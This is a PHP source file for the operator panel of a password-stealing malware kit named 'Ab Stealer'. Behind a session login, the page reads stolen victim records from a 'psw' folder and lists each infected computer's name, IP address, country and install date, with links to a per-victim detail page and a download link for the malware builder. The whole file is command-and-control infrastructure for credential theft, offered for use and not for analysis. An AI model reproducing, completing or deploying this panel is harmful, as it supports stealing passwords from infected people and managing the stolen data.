<?php 
session_start();
if (isset($_SESSION['login'])) {
    if ($_SESSION['login'] == '0') {
        header("location: index.php");
    }
} else {
    header('location: index.php');
}
$ipage = '';
if (isset($_GET['p'])) {
    $ipage = $_GET['p'];
} else {
    $ipage = 1;
}
$path    = 'psw';
$files = array_diff(scandir($path), array('.', '..'));
?>
<html>
    <head>
        <title>Ab Stealer</title>
        <link type="text/css" rel="stylesheet" href="style.css" >
        <script src="https://use.fontawesome.com/ef7ebb85cf.js"></script>
    </head>
    <body>
        <section class="logo">
            <img src="img/Logo.png">
            <section class="button">
                <a href="img/AbBuild v.1.0.rar" id="a1"><i class="fa fa-arrow-circle-down" aria-hidden="true"></i>&nbsp;Download Builder</a>
                <a href="logout.php" id="a2"><i class="fa fa-sign-out" aria-hidden="true"></i>&nbsp;Logout</a>
            </section>
        </section>
        <section class="Table">
            <table border="1" style="width:100%">
                <tr id="Title" style="text-align: center;">
                    <td>Name</td>
                    <td>Country</td>
                    <td>Install Date</td>
                </tr>
                <?php
                if (count($files) == 0) {
                    echo '
                    <tr>
                        <td colspan="3">Cant Find Any Victims Online .</td>
                    </tr>';
                } else {
                    for ($i=round(($ipage * 10) - 10);$i <= round($ipage * 10);$i++) {
                        $FileName = 'psw/ip-'.$i.'.txt';
                        if (file_exists($FileName)) {
                            $myfile = fopen($FileName, "r") or die("");
                            $FileData = fread($myfile,filesize($FileName));
                            fclose($myfile);
                            $NewFileData = json_decode($FileData);
                            echo '<tr>
                        <td><h>#'.$i.'</h>&nbsp;&nbsp;&nbsp;<a href="ps.php?id='.$i.'">'.$NewFileData -> {'computername'}.' {'.$NewFileData -> {'ip'}.'}</a></td>
                        <td>'.$NewFileData -> {'country'}.'</td>
                        <td>'.$NewFileData -> {'date'}.'</td>
                        </tr>';
                        }
                    }
                }
                ?>
            </table>
        </section>
        <section class="Pages">
            <h style="color: red;">Pages : </h>
            <?php
            $CountFiles = round(count($files) / 10) + 1;
            if ($ipage > $CountFiles) { header('location: Panel.php?p='.$CountFiles); }
            for ($i=1;$i <= $CountFiles;$i++) {
                if ($i == $ipage) {
                    echo '<a id="p1">'.$i.'</a> ';
                } else {
                    echo '<a id="p2" href="Panel.php?p='.$i.'">'.$i.'</a> ';
                }
            }
            ?>
        </section><br><br><br><br><br><br><br>
    </body>
</html>